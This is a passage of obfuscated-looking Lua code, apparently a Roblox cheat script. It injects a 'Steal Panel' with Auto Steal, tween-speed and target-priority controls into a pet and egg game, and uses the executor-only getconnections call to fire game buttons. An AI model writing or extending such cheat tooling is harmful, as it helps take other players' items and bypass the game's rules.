			local flag9 = false

			for _, v26 in ipairs({ v16.ActivePets, v16.GrowingEggs }) do
				if v26 and v26.Enabled then
					local frame = v26:FindFirstChild("Frame")
					frame = frame and frame:FindFirstChild("Close")
					local flag10 = frame and typeof(getconnections) == "function"
					local flag11 = false

					if flag10 then
						local ok, result = pcall(getconnections, frame.Activated)

						if ok and type(result) == "table" then
							for _, v27 in ipairs(result) do
								if pcall(function()
									v27:Fire()
								end) then
									flag11 = true
								end
							end
						end
					end

					if not flag11 then
						v26.Enabled = false
					end

					flag9 = true
				end
			end

			return flag9
		end

		local function fn35(arg, arg2)
			local column = v16 and v16.Column
			if not column or not column.Parent then
				return
			end

			if tween2 then
				tween2:Cancel()
				tween2 = nil
			end

			local position2 = column.Position
			local udim2 = UDim2.new(position2.X.Scale, arg and math.ceil(column.AbsoluteSize.X * n14) or 0, position2.Y.Scale, position2.Y.Offset)
			if arg2 then
				column.Position = udim2
				return
			end
			tween2 = TweenService:Create(column, arg and tweenInfo3 or tweenInfo4, { Position = udim2 })
			tween2:Play()
		end

		local n22 = 0.106
		local udim2 = UDim2.new(0.955, 0, 0.6, 0)
		local udim22 = UDim2.new(0.955 - n22, 0, 0.6, 0)
		local udim23 = UDim2.new(0.2, 0, 0.56, 0)
		local n23 = 0.955 - n22

		local function fn36(arg, visible)
			if arg and arg.Button.Visible ~= visible then
				arg.Button.Visible = visible
			end
		end

		local function fn37(arg, rank, arg2, arg3)
			local visible = rank ~= nil
			arg.Rank = rank
			fn36(arg.Steal, not visible)
			fn36(arg.Up, visible)
			fn36(arg.Down, visible)
			fn36(arg.Cancel, visible)

			if visible then
				fn29(arg.Up, rank > 1 and tbl16.Hud or tbl16.Queued)
				fn29(arg.Down, rank < (arg3 or rank) and tbl16.Hud or tbl16.Queued)
			end

			fn29(arg.Star, rank == 1 and tbl16.PriorityOn or tbl16.Queued)

			if arg.Badge then
				if arg.Badge.Visible ~= visible then
					arg.Badge.Visible = visible
				end

				if visible then
					fn18(arg.Badge, "#" .. rank)
					local steal = arg2 and tbl16.Steal or tbl16.PriorityOn

					if arg.BadgeStyle ~= steal and arg.BadgeGradient then
						arg.BadgeStyle = steal
						arg.BadgeGradient.Color = steal.Color
						arg.BadgeGradient.Rotation = 90
					end
				end
			end
		end

		local function fn38()
			if not tbl20 then
				return
			end
			local v26 = tbl3.Toggle(v4, false)

			if tbl20.On ~= v26 then
				tbl20.On = v26
				fn29(tbl20.Toggle, v26 and tbl16.Steal or tbl16.Cancel)
				fn18(tbl20.Toggle.Label, v26 and "Auto Steal: ON" or "Auto Steal: OFF")
			end

			local dragValue = tbl20.Dragging and tbl20.DragValue

			if not dragValue then
				dragValue = math.clamp(math.floor((tonumber(n2) or 400) + 0.5), 100, 1000)
			end

			if tbl20.Speed ~= dragValue then
				tbl20.Speed = dragValue
				tbl20.Fill.Size = UDim2.new((dragValue - 100) / 900, 0, 1, 0)
				fn18(tbl20.Text, "Tween Speed: " .. dragValue)
			end
		end

		local n24 = 4
		local tbl27 = {}
		local tbl28 = {}

		local function fn39()
			if not v22 then
				return
			end
			fn38()
			local tbl29 = {}

			for _, v26 in pairs(tbl23) do
				table.insert(tbl29, v26)
			end

			local tbl30 = {}
			local v26 = nil

			if type(tbl3.StealPlan) == "function" then
				task.spawn(function()
					local ok, result, result2 = pcall(tbl3.StealPlan)

					if ok and type(result) == "table" then
						tbl30 = result
						v26 = result2
					end
				end)
			end

			local tbl31 = {}

			for i, v27 in ipairs(tbl30) do
				if tbl31[v27] == nil then
					tbl31[v27] = i
				end
			end

			local v27 = tbl15[n18]
			local v28 = tbl3.Root()

			local function fn40(arg)
				if not v28 or not arg.Position then
					return math.huge
				end
				return (v28.Position - arg.Position).Magnitude
			end

			table.sort(tbl29, function(arg, arg2)
				local v29 = tbl31[arg.Uid]
				local v30 = tbl31[arg2.Uid]
				if v29 ~= nil ~= v30 ~= nil then
					return v29 ~= nil
				end

				if v29 and v30 then
					return v29 < v30
				end

				if v27 == "Rarity" and arg.Style.RarityNumber ~= arg2.Style.RarityNumber then
					return arg.Style.RarityNumber > arg2.Style.RarityNumber
				end

				if v27 == "Distance" then
					local v31 = fn40(arg)
					local v32 = fn40(arg2)
					if v31 ~= v32 then
						return v31 < v32
					end
				end

				if arg.Value ~= arg2.Value then
					return arg.Value > arg2.Value
				end
				return arg.Uid < arg2.Uid
			end)

			local now = os.clock()
			local tbl32 = {}
			local tbl33 = {}

			for _, v29 in ipairs(tbl29) do
				local v30 = tbl27[v29.Uid]

				if v30 and v30 > now and tbl28[v29.Uid] then
					table.insert(tbl33, v29)
				else
					tbl27[v29.Uid] = nil
					table.insert(tbl32, v29)
				end
			end

			table.sort(tbl33, function(arg, arg2)
				return tbl28[arg.Uid] < tbl28[arg2.Uid]
			end)

			for _, v29 in ipairs(tbl33) do
				table.insert(tbl32, math.clamp(tbl28[v29.Uid], 1, #tbl32 + 1), v29)
			end

			table.clear(tbl28)

			for i, v29 in ipairs(tbl32) do
				tbl28[v29.Uid] = i
				local v30 = tbl22[v29.Uid]

				if v30 then
					if v30.Frame.LayoutOrder ~= i then
						v30.Frame.LayoutOrder = i
					end

					fn37(v30, tbl31[v29.Uid], v29.Uid == v26, #tbl30)
				end
			end
		end

		local function fn40()
			if not v22 then
				return
			end
			local n25 = math.max(1, math.floor(v22.AbsoluteSize.X / n12 + 0.5))
			if n25 == n16 then
				return
			end
			n16 = n25

			for _, v26 in pairs(tbl22) do
				v26.Frame.Size = UDim2.new(1, 0, 0, n25)
			end
		end

		local function fn41(arg)
			local clone = v23:Clone()
			local spacer = clone:FindFirstChild("Spacer")
			local textLabel = spacer:FindFirstChild("TextLabel")

			local tbl29 = {
				Uid = arg,
				Frame = clone,
				Icon = spacer:FindFirstChild("Icon"),
				Label = textLabel,
				ValueLabel = spacer:FindFirstChild("Value"),
			}

			tbl29.Gradient = textLabel and textLabel:FindFirstChildOfClass("UIGradient")
			tbl29.Steal = fn28(spacer:FindFirstChild("Unequip"))
			tbl29.Cancel = fn28(spacer:FindFirstChild("Cancel"))
			tbl29.Star = fn28(spacer:FindFirstChild("Star"))
			tbl29.Up = fn28(spacer:FindFirstChild("Up"))
			tbl29.Down = fn28(spacer:FindFirstChild("Down"))
			tbl29.Badge = spacer:FindFirstChild("Rank")
			tbl29.BadgeGradient = tbl29.Badge and tbl29.Badge:FindFirstChildOfClass("UIGradient") or nil

			if textLabel and not tbl29.Gradient then
				tbl29.Gradient = Instance.new("UIGradient")
				tbl29.Gradient.Parent = textLabel
			end

			fn30(tbl29.Steal)
			fn30(tbl29.Cancel)
			fn30(tbl29.Star)
			fn30(tbl29.Up)
			fn30(tbl29.Down)

			for _, v26 in ipairs({ { tbl29.Up, -1 }, { tbl29.Down, 1 } }) do
				if v26[1] then
					v26[1].Button.Activated:Connect(function()
						if type(tbl3.MoveInPlan) == "function" then
							tbl3.MoveInPlan(tbl29.Uid, v26[2])
						end

						fn39()
					end)
				end
			end

			if tbl29.Steal then
				tbl29.Steal.Button.Activated:Connect(function()
					if tbl29.Rank == nil and type(tbl3.StealNow) == "function" then
						tbl3.StealNow(tbl29.Uid, false)
					end

					fn39()
				end)
			end

			if tbl29.Cancel then
				tbl29.Cancel.Button.Activated:Connect(function()
					tbl27[tbl29.Uid] = os.clock() + n24

					if type(tbl3.CancelSteal) == "function" then
						tbl3.CancelSteal(tbl29.Uid)
					end

					fn39()
				end)
			end

			if tbl29.Star then
				tbl29.Star.Button.Activated:Connect(function()
					if type(tbl3.PrioritizeSteal) == "function" then
						tbl3.PrioritizeSteal(tbl29.Uid)
					end

					fn39()
				end)
			end

			fn25(clone, true)
			fn22(clone)
			clone.Size = UDim2.new(1, 0, 0, math.max(n16, 1))
			clone.Visible = true
			clone.Parent = v22
			return tbl29
		end

		local function fn42(arg, arg2)
			local style = arg2.Style

			if arg.Category ~= arg2.Category then
				arg.Category = arg2.Category

				if arg.Icon then
					arg.Icon.Image = style.Icon
				end

				if arg.Gradient then
					arg.Gradient.Color = style.GradientColor
					arg.Gradient.Rotation = style.GradientRotation
				end
			end

			fn18(arg.Label, style.Name)
			fn18(arg.ValueLabel, fn17(arg2.Value))
		end

		local fn43 = nil

		local function fn44(arg)
			local v26 = fn32()

			if v26 and arg == n15 and flag2 then
				local tbl29 = {}
				local now = os.clock()
				local n25 = -1
				local v27 = nil

				for _, v28 in pairs(v26) do
					local uid = type(v28) == "table" and v28.Uid or nil
					local flag9 = v28.State == "Slot" or v28.State == "Dropped" or v28.State == "Carried"

					if type(uid) == "string" and flag9 and type(v28.AssetCategory) == "string" then
						tbl29[uid] = true
						local v29 = fn15(v28.AssetCategory)
						local v30 = tbl23[uid]

						if not v30 then
							local tbl30 = { Uid = uid }
							tbl23[uid] = tbl30
							v30 = tbl30
						end

						v30.Category = v28.AssetCategory
						v30.Style = v29
						v30.Value = fn16(v28, v29)
						v30.Position = typeof(v28.BottomCFrame) == "CFrame" and v28.BottomCFrame.Position or nil

						if (v28.State == "Slot" or v28.State == "Dropped") and v29.Icon ~= "" and v30.Value > n25 then
							n25 = v30.Value
							v27 = v30
						end

						if flag4 and v22 then
							local v31 = tbl22[uid]

							if not v31 then
								v31 = fn41(uid)
								tbl22[uid] = v31
							end

							fn42(v31, v30)
						end
					end

					if not (n7 < os.clock() - now) then
						continue
					end
					RunService.Heartbeat:Wait()
					now = os.clock()
					if arg ~= n15 or not flag2 then
						return
					end
				end

				for k in pairs(tbl23) do
					if not tbl29[k] then
						tbl23[k] = nil
						local v28 = tbl22[k]

						if v28 then
							tbl22[k] = nil
							v28.Frame:Destroy()
						end
					end
				end

				if imageLabel and v27 and imageLabel.Image ~= v27.Style.Icon then
					imageLabel.Image = v27.Style.Icon
				end

				fn39()
			end
		end

		local n25 = 0

		local function fn45(arg)
			if flag7 and os.clock() - n25 < 10 then
				flag8 = true
				return
			end
			flag7 = true
			n25 = os.clock()
			pcall(fn44, arg)

			if n25 == n25 then
				flag7 = false
			end

			if flag8 then
				flag8 = false
				fn43()
			end
		end

		fn43 = function()
			local v26 = flag6
			local flag9

			if flag6 then
				flag9 = v26
			else
				flag9 = not flag2
			end

			if flag9 then
				return
			end
			flag6 = true
			local v27 = n15

			task.delay(flag4 and 0.15 or 1, function()
				flag6 = false

				if flag2 and v27 == n15 then
					task.spawn(pcall, fn45, v27)
				end
			end)
		end

		local function fn46(arg)
			local v26 = flag4
			local flag9

			if flag4 then
				flag9 = v26
			else
				flag9 = not v20
			end

			if flag9 then
				return
			end
			flag4 = true

			if arg then
				v24:Set(true)
			end

			if fn34() then
				RunService.Heartbeat:Wait()
				if not flag4 or not v20 then
					return
				end
			end

			fn35(true)
			v19.Enabled = true

			if tween then
				tween:Cancel()
			end

			local scale = position.Y.Scale
			local offset = position.Y.Offset
			v20.Position = UDim2.new(position.X.Scale, math.ceil(v20.AbsoluteSize.X * n13), scale, offset)
			tween = TweenService:Create(v20, tweenInfo, { Position = position })
			tween:Play()
			fn27()
			fn40()
			task.spawn(pcall, fn45, n15)
		end

		local function fn47(arg, arg2)
			if not flag4 or not v20 then
				return
			end
			flag4 = false

			if arg2 then
				v24:Set(false)
			end

			if tween then
				tween:Cancel()
			end

			local scale = position.Y.Scale
			local offset = position.Y.Offset
			local tween3 = TweenService:Create(v20, tweenInfo2, { Position = UDim2.new(position.X.Scale, math.ceil(v20.AbsoluteSize.X * n13), scale, offset) })
			tween = tween3

			tween3.Completed:Connect(function(playbackState)
				if playbackState == Enum.PlaybackState.Completed and tween == tween3 and not flag4 and v19 then
					v19.Enabled = false
					v20.Position = position
				end
			end)

			tween3:Play()

			if arg then
				fn35(false)
			end
		end

		local function createScreenGui(arg)
			local screenGui = Instance.new("ScreenGui")
			screenGui.Name = fn3()
			screenGui.Archivable = false
			screenGui.ResetOnSpawn = false
			screenGui.IgnoreGuiInset = arg.IgnoreGuiInset
			screenGui.ZIndexBehavior = arg.ZIndexBehavior
			screenGui.DisplayOrder = arg.DisplayOrder

			pcall(function()
				screenGui.ScreenInsets = arg.ScreenInsets
			end)

			return screenGui
		end

		local function fn48()
			if v17 and v17.Parent and v18 and v18.Button then
				return true
			end
			local v26 = fn21(v16.Pets)
			if not v26 then
				return false
			end

			for _, v27 in ipairs({ "Notification", "ReadyNotification", "NightImage", "NightText", "ConsoleButton", "Badge" }) do
				local v28 = v26:FindFirstChild(v27)

				if v28 then
					v28:Destroy()
				end
			end

			v18 = fn28(v26)
			imageLabel = v26:FindFirstChild("ImageLabel")

			if v18.Scale then
				v18.Scale.Scale = 1
			end

			fn29(v18, tbl16.Chilli)
			fn30(v18)
			fn31(v18)
			v26.AnchorPoint = Vector2.new(0.5, 0.5)
			v26.LayoutOrder = 0

			v26.Activated:Connect(function()
				if not v19 or not v19.Parent then
					task.spawn(function()
						pcall(fn19)
						task.wait(0.15)

						if v19 and not flag4 then
							pcall(fn46, true)
						end
					end)

					return
				end

				if flag4 then
					fn47(true, true)
				else
					task.spawn(fn46, true)
				end
			end)

			fn25(v26)
			fn22(v26)
			v17 = createScreenGui(v16.Hud)
			v26.Parent = v17
			v17.Parent = v3
			return true
		end

		local v26 = nil
		local v27 = nil

		local function fn49()
			local button = v18 and v18.Button
			local eggs = v16.Eggs
			local pets = v16.Pets
			if not button or not eggs.Parent or not pets.Parent then
				return
			end

			if v16.Hud.Enabled and v16.GameHud.Visible and v16.Column.Visible and eggs.Visible and pets.Visible and eggs.AbsoluteSize.X > 0 then
				local uiScale = eggs:FindFirstChildOfClass("UIScale")
				uiScale = uiScale and uiScale.Scale or 1

				if uiScale <= 0 then
					uiScale = 1
				end

				local n26 = eggs.AbsolutePosition + eggs.AbsoluteSize / 2
				local n27 = eggs.AbsoluteSize / uiScale
				local absolutePosition = v17.AbsolutePosition
				local udim24 = UDim2.fromOffset(n26.X - absolutePosition.X, n26.Y - (pets.AbsolutePosition + pets.AbsoluteSize / 2).Y - n26.Y - absolutePosition.Y)
				local udim25 = UDim2.fromOffset(n27.X, n27.Y)

				if not flag4 then
					v26 = udim24
					v27 = udim25
				end

				if button.Position ~= udim24 then
					button.Position = udim24
				end

				if button.Size ~= udim25 then
					button.Size = udim25
					fn26()
				end
			elseif not flag4 and v26 then
				if button.Position ~= v26 then
					button.Position = v26
				end

				if v27 and button.Size ~= v27 then
					button.Size = v27
					fn26()
				end
			end

			if button.Visible ~= true then
				button.Visible = true
			end
		end

		local function fn50()
			local frame = v16.ActivePets.Frame
			local v28 = fn21(frame)
			if not v28 then
				return false
			end
			local header = v28:FindFirstChild("Header")
			local scrollingFrame = v28:FindFirstChild("ScrollingFrame")
			local close = v28:FindFirstChild("Close")
			local template = scrollingFrame and scrollingFrame:FindFirstChild("Template")
			local spacer = template and template:FindFirstChild("Spacer")
			local unequip = spacer and spacer:FindFirstChild("Unequip")
			local textLabel = spacer and spacer:FindFirstChild("TextLabel")
			if not (header and scrollingFrame and close and spacer and unequip and textLabel) then
				v28:Destroy()
				return false
			end

			for _, child in ipairs(scrollingFrame:GetChildren()) do
				if child ~= template and child:IsA("GuiObject") and child.Name ~= "EmptyLast" then
					child:Destroy()
				end
			end

			local equipBest = v28:FindFirstChild("EquipBest")

			if equipBest then
				equipBest:Destroy()
			end

			local uiAspectRatioConstraint = v28:FindFirstChildOfClass("UIAspectRatioConstraint")
			local aspectRatio = uiAspectRatioConstraint and uiAspectRatioConstraint.AspectRatio or 1.25
			local flag9 = not UserInputService.MouseEnabled
			local n26 = flag9 and 1.2 or 1
			local n27 = flag9 and 1.15 or 1
			local aspectRatio2 = n11 / n27
			local n28 = aspectRatio2 / aspectRatio
			tbl21 = { Width = frame.Size.X.Scale, Height = frame.Size.Y.Scale, Aspect = aspectRatio }
			v28.Size = UDim2.new(n9 * n26, 0, n10 * n26 * n27, 0)

			if not uiAspectRatioConstraint then
				uiAspectRatioConstraint = Instance.new("UIAspectRatioConstraint")
				uiAspectRatioConstraint.Parent = v28
			end

			uiAspectRatioConstraint.AspectRatio = aspectRatio2
			uiAspectRatioConstraint.AspectType = Enum.AspectType.FitWithinMaxSize
			header.Size = UDim2.new(header.Size.X.Scale, header.Size.X.Offset, header.Size.Y.Scale * n28, header.Size.Y.Offset)
			header.Position = UDim2.new(header.Position.X.Scale, header.Position.X.Offset, header.Position.Y.Scale * n28, header.Position.Y.Offset)
			close.Size = UDim2.new(close.Size.X.Scale * 1, close.Size.X.Offset, close.Size.Y.Scale * n28, close.Size.Y.Offset)
			close.Position = UDim2.new(close.Position.X.Scale * 1, close.Position.X.Offset, close.Position.Y.Scale, close.Position.Y.Offset)
			local scale = scrollingFrame.Size.Y.Scale
			local scale2 = scrollingFrame.Position.Y.Scale
			local y = scrollingFrame.AnchorPoint.Y
			local n29 = (scale2 - scale * y) * n28
			local n30 = 1 - (1 - scale2 + scale * (1 - y)) * n28
			scrollingFrame.Size = UDim2.new(scrollingFrame.Size.X.Scale, scrollingFrame.Size.X.Offset, n30 - n29, 0)
			scrollingFrame.Position = UDim2.new(scrollingFrame.Position.X.Scale, scrollingFrame.Position.X.Offset, n29 + (n30 - n29) * y, 0)
			local scale3 = scrollingFrame.Size.Y.Scale
			local y2 = scrollingFrame.AnchorPoint.Y
			local n31 = scrollingFrame.Position.Y.Scale - scale3 * y2
			local n32 = n31 + scale3
			local n33 = 0.1 * n28
			local n34 = 0.02 * n28
			local frame2 = Instance.new("Frame")
			frame2.BackgroundTransparency = 1
			frame2.BorderSizePixel = 0
			frame2.AnchorPoint = Vector2.new(0.5, 0)
			frame2.Position = UDim2.new(0.5, 0, n31 + n34, 0)
			frame2.Size = UDim2.new(0.9, 0, n33, 0)
			frame2.Parent = v28
			local n35 = n31 + n34 * 1.5 + n33
			scrollingFrame.Size = UDim2.new(scrollingFrame.Size.X.Scale, scrollingFrame.Size.X.Offset, n32 - n35, 0)
			scrollingFrame.Position = UDim2.new(scrollingFrame.Position.X.Scale, scrollingFrame.Position.X.Offset, n35 + (n32 - n35) * y2, 0)
			local clone = unequip:Clone()
			clone.AnchorPoint = Vector2.new(0, 0.5)
			clone.Position = UDim2.new(0, 0, 0.5, 0)
			clone.Size = UDim2.new(0.37, 0, 1, 0)
			clone.Parent = frame2
			local v29 = fn28(clone)
			fn30(v29)

			clone.Activated:Connect(function()
				local v30 = v4
				local flag10 = v4

				if v30 then
					flag10 = type(v30.Set) == "function"
				end

				if flag10 then
					pcall(v30.Set, v30, not tbl3.Toggle(v30, false))
				end

				task.defer(fn38)
			end)

			local frame3 = v16.GrowingEggs and v16.GrowingEggs:FindFirstChild("Frame")
			frame3 = frame3 and frame3:FindFirstChild("ScrollingFrame")
			frame3 = frame3 and frame3:FindFirstChild("Template")
			frame3 = frame3 and frame3:FindFirstChild("Spacer")
			frame3 = frame3 and frame3:FindFirstChild("Progress")
			frame3 = frame3 and fn21(frame3) or nil
			local fill = frame3 and frame3:FindFirstChild("Fill")
			local textLabel2 = frame3 and frame3:FindFirstChild("TextLabel")

			if not (frame3 and fill and textLabel2) then
				if frame3 then
					frame3:Destroy()
				end

				frame3 = Instance.new("Frame")
				frame3.BackgroundColor3 = color2(17, 17, 22)
				frame3.BackgroundTransparency = 0.25
				frame3.BorderSizePixel = 0
				fill = Instance.new("Frame")
				fill.BackgroundColor3 = color2(78, 255, 69)
				fill.BorderSizePixel = 0
				fill.AnchorPoint = Vector2.new(0, 0.5)
				fill.Position = UDim2.new(0, 0, 0.5, 0)
				fill.Parent = frame3
				textLabel2 = Instance.new("TextLabel")
				textLabel2.BackgroundTransparency = 1
				textLabel2.AnchorPoint = Vector2.new(0.5, 0.5)
				textLabel2.Position = UDim2.new(0.5, 0, 0.5, 0)
				textLabel2.TextScaled = true
				textLabel2.TextColor3 = color2(255, 255, 255)
				textLabel2.ZIndex = 3
				textLabel2.Parent = frame3
			end

			frame3.AnchorPoint = Vector2.new(1, 0.5)
			frame3.Position = UDim2.new(1, 0, 0.5, 0)
			frame3.Size = UDim2.new(0.6, 0, 0.8, 0)
			frame3.Active = true
			textLabel2.Size = UDim2.new(0.92, 0, 0.9, 0)
			frame3.Parent = frame2
			tbl20 = { Toggle = v29, Fill = fill, Text = textLabel2 }

			local function fn51(arg)
				return math.clamp(math.floor((100 + math.clamp((arg - frame3.AbsolutePosition.X) / math.max(frame3.AbsoluteSize.X, 1), 0, 1) * 900) / 10 + 0.5) * 10, 100, 1000)
			end

			local function fn52(dragValue)
				if not tbl20 then
					return
				end
				tbl20.DragValue = dragValue
				fn38()

				if tbl20.Sent ~= dragValue then
					tbl20.Sent = dragValue
					local v30 = v5
					local flag10 = v5

					if v30 then
						flag10 = type(v30.Set) == "function"
					end

					if flag10 then
						pcall(v30.Set, v30, dragValue)
					else
						n = dragValue
						n2 = dragValue
					end
				end
			end

			local function fn53(arg)
				return arg.UserInputType == Enum.UserInputType.MouseButton1 or arg.UserInputType == Enum.UserInputType.Touch
			end

			frame3.InputBegan:Connect(function(input)
				if tbl20 and fn53(input) then
					tbl20.Dragging = true
					fn52(fn51(input.Position.X))
				end
			end)

			table.insert(tbl24, UserInputService.InputChanged:Connect(function(input)
				if tbl20 and tbl20.Dragging and (input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch) then
					fn52(fn51(input.Position.X))
				end
			end))

			table.insert(tbl24, UserInputService.InputEnded:Connect(function(input)
				if tbl20 and tbl20.Dragging and fn53(input) then
					tbl20.Dragging = false
					fn38()
				end
			end))

			local uiGradient = header:FindFirstChildOfClass("UIGradient")

			if uiGradient then
				local v30 = fn14
				local tbl29 = {}
				local tbl30 = { 0, color2(200, 18, 24) }
				local tbl31 = { 0.53, color2(255, 88, 90) }
				local tbl32 = { 1, color2(214, 28, 34) }
				tbl29[1] = tbl30
				tbl29[2] = tbl31
				tbl29[3] = tbl32
				uiGradient.Color = v30(tbl29)
			end

			title = header:FindFirstChild("Title")
			fn18(title, "Steal Panel")
			local plusEquip = header:FindFirstChild("PlusEquip")
			v21 = fn28(plusEquip)

			if v21 then
				fn29(v21, tbl16.Steal)
				fn18(v21.Label, "Sort: " .. tbl15[n18])
				fn30(v21)

				plusEquip.Activated:Connect(function()
					n18 = n18 % #tbl15 + 1
					fn18(v21.Label, "Sort: " .. tbl15[n18])
					fn39()
				end)
			end

			local v30 = fn28(close)
			fn30(v30)

			close.Activated:Connect(function()
				fn47(true, true)
			end)

			local clone2 = unequip:Clone()
			clone2.Name = "Cancel"
			clone2.Parent = spacer
			local uiAspectRatioConstraint2 = Instance.new("UIAspectRatioConstraint")
			uiAspectRatioConstraint2.AspectRatio = 1
			uiAspectRatioConstraint2.DominantAxis = Enum.DominantAxis.Height
			uiAspectRatioConstraint2.Parent = clone2
			unequip.Size = UDim2.new(0.24, 0, unequip.Size.Y.Scale, 0)
			unequip.Position = UDim2.new(0.852, 0, 0.5, 0)
			clone2.Size = UDim2.new(0.105, 0, unequip.Size.Y.Scale, 0)
			clone2.Position = UDim2.new(0.965, 0, 0.5, 0)
			local icon = spacer:FindFirstChild("Icon")

			if icon then
				icon.AnchorPoint = Vector2.new(0.5, 0.5)
				icon.Size = UDim2.new(0.2, 0, 1.3, 0)
				icon.Position = UDim2.new(0.1, 0, 0.5, 0)
			end

			textLabel.Size = UDim2.new(0.38, 0, 0.4, 0)
			textLabel.Position = UDim2.new(0.415, 0, 0.33, 0)
			fn18(textLabel, "")
			local clone3 = textLabel:Clone()
			clone3.Name = "Value"
			clone3.Size = UDim2.new(0.38, 0, 0.32, 0)
			clone3.Position = UDim2.new(0.415, 0, 0.72, 0)
			local uiGradient2 = clone3:FindFirstChildOfClass("UIGradient")

			if not uiGradient2 then
				uiGradient2 = Instance.new("UIGradient")
				uiGradient2.Parent = clone3
			end

			uiGradient2.Color = tbl16.Steal.Color
			uiGradient2.Rotation = tbl16.Steal.Rotation
			clone3.Parent = spacer
			local v31 = fn28(unequip)
			fn18(v31.Label, "Steal")
			fn29(v31, tbl16.Steal)
			local v32 = fn28(clone2)
			fn18(v32.Label, "X")
			fn29(v32, tbl16.Cancel)
			clone2.Position = udim2
			clone2.Visible = false
			unequip.Position = udim22
			unequip.Size = udim23
			local clone4 = clone2:Clone()
			clone4.Name = "Star"
			clone4.AnchorPoint = Vector2.new(1, 0.5)
			clone4.Size = UDim2.new(0.1, 0, 0.56, 0)
			clone4.Position = udim2
			clone4.Visible = true
			clone4.Parent = spacer
			local v33 = fn28(clone4)
			fn18(v33.Label, utf8.char(9733))
			fn29(v33, tbl16.Queued)
			local v34 = ipairs
			local tbl29 = {}
			local tbl30 = {}
			local v35 = utf8.char(9650)
			local n36 = n23 - n22
			tbl30[1] = "Up"
			tbl30[2] = v35
			tbl30[3] = n36
			local tbl31 = {}
			local v36 = utf8.char(9660)
			tbl31[1] = "Down"
			tbl31[2] = v36
			tbl31[3] = n23
			tbl29[1] = tbl30
			tbl29[2] = tbl31

			for _, v37 in v34(tbl29) do
				local clone5 = clone2:Clone()
				clone5.Name = v37[1]
				clone5.AnchorPoint = Vector2.new(1, 0.5)
				clone5.Size = UDim2.new(0.1, 0, 0.56, 0)
				clone5.Position = UDim2.new(v37[3], 0, 0.6, 0)
				clone5.Visible = false
				clone5.Parent = spacer
				local v38 = fn28(clone5)
				fn18(v38.Label, v37[2])
				fn29(v38, tbl16.Hud)
			end

			clone2.AnchorPoint = Vector2.new(1, 0)
			clone2.Position = UDim2.new(0.99, 0, 0.04, 0)
			clone2.Size = UDim2.new(0.06, 0, 0.28, 0)
			clone2.ZIndex = 8

			for _, descendant in ipairs(clone2:GetDescendants()) do
				if descendant:IsA("GuiObject") then
					descendant.ZIndex = descendant.ZIndex + 8
				end
			end

			local clone5 = clone3:Clone()
			clone5.Name = "Rank"
			clone5.AnchorPoint = Vector2.new(0, 0)
			clone5.Position = UDim2.new(0.012, 0, 0.03, 0)
			clone5.Size = UDim2.new(0.1, 0, 0.36, 0)
			clone5.TextXAlignment = Enum.TextXAlignment.Left
			clone5.ZIndex = 6
			clone5.Visible = false
			fn18(clone5, "#1")
			local uiGradient3 = clone5:FindFirstChildOfClass("UIGradient")

			if uiGradient3 then
				uiGradient3.Color = tbl16.PriorityOn.Color
				uiGradient3.Rotation = 90
			end

			clone5.Parent = spacer
			template.Visible = false
			template.Parent = nil
			v23 = template
			v22 = scrollingFrame
			v20 = v28
			position = frame.Position
			v28.Position = position
			fn25(v28, true)
			fn22(v28)
			v19 = createScreenGui(v16.ActivePets)
			v19.Enabled = false
			v28.Parent = v19
			v19.Parent = v3
			table.insert(tbl24, scrollingFrame:GetPropertyChangedSignal("AbsoluteSize"):Connect(fn40))
			table.insert(tbl24, v28:GetPropertyChangedSignal("AbsoluteSize"):Connect(fn27))
			return true
		end

		local function fn51()
			if not flag2 then
				return
			end
			flag2 = false
			n15 += 1
			flag6 = false
			flag8 = false

			if flag4 then
				flag4 = false

				if not fn33() then
					fn35(false, true)
				end
			end

			if tween then
				tween:Cancel()
				tween = nil
			end

			tbl4.DisconnectAll(tbl24)
			table.clear(tbl22)
			table.clear(tbl23)

			if v19 then
				v19:Destroy()
			end

			if v23 then
				v23:Destroy()
			end

			v19 = nil
			v20 = nil
			position = nil
			title = nil
			v21 = nil
			v22 = nil
			v23 = nil
			n16 = 0
			tbl20 = nil
			tbl21 = nil
			n17 = 1
			v16 = nil
		end

		fn19 = function()
			if flag2 then
				return
			end
			local v28 = fn20()

			if not v28 then
				if not flag3 then
					flag3 = true

					task.delay(2, function()
						flag3 = false

						if not flag2 and tbl3.Toggle(nil, true) then
							fn19()
						end
					end)
				end

				return
			end

			v16 = v28
			flag2 = true
			n15 += 1
			local v29 = n15
			uiStroke = v16.ActivePets.Frame:FindFirstChildOfClass("UIStroke")
			thickness = uiStroke and uiStroke.Thickness or nil
			tbl25.Panel = thickness or 2.3120369911193848
			local uiStrokeClr = v16.Pets:FindFirstChild("UIStrokeClr")
			tbl25.Hud = uiStrokeClr and uiStrokeClr:IsA("UIStroke") and uiStrokeClr.Thickness or 2.3120369911193848
			if not fn48() or not fn50() then
				fn51()
				return
			end

			if flag5 then
				flag5 = false
				task.spawn(fn46)
			end

			table.insert(tbl24, RunService.RenderStepped:Connect(fn49))

			if uiStroke then
				table.insert(tbl24, uiStroke:GetPropertyChangedSignal("Thickness"):Connect(fn26))
			end

			for _, v30 in ipairs({ v16.ActivePets, v16.GrowingEggs }) do
				if v30 then
					table.insert(tbl24, v30:GetPropertyChangedSignal("Enabled"):Connect(function()
						if v30.Enabled and flag4 then
							fn47(false)
						end
					end))
				end
			end

			local eggState = tbl.EggState

			if type(eggState) == "table" then
				for _, v30 in ipairs({ "FieldRefreshed", "FieldShifted", "FieldGone", "FieldClaimed", "SnapshotRefreshed" }) do
					local v31 = eggState[v30]

					if type(v31) == "table" and type(v31.Connect) == "function" then
						local ok, result = pcall(v31.Connect, v31, fn43)

						if ok and result then
							table.insert(tbl24, result)
						end
					end
				end
			end

			local areaEggSlotsClient = workspace:FindFirstChild("AreaEggSlotsClient")

			if areaEggSlotsClient then
				table.insert(tbl24, areaEggSlotsClient.ChildAdded:Connect(fn43))
				table.insert(tbl24, areaEggSlotsClient.ChildRemoved:Connect(fn43))
			end

			task.spawn(function()
				local n26 = 0

				while true do
					if flag2 and v29 == n15 then
						n26 += task.wait(0.5)

						if not (not flag2 or v29 ~= n15) then
							if not (v16.Eggs:IsDescendantOf(game) and v16.ActivePets:IsDescendantOf(game)) then
								task.defer(function()
									fn51()

									if tbl3.Toggle(nil, true) then
										fn19()
									end
								end)

								break
							else
								if n6 <= n26 then
									fn43()
									n26 = 0
								elseif flag4 then
									fn39()
								end

								continue
							end
						end
					end

					break
				end
			end)

			task.spawn(pcall, fn45, v29)
		end

		fn4(function()
			fn51()

			if v17 then
				v17:Destroy()
			end

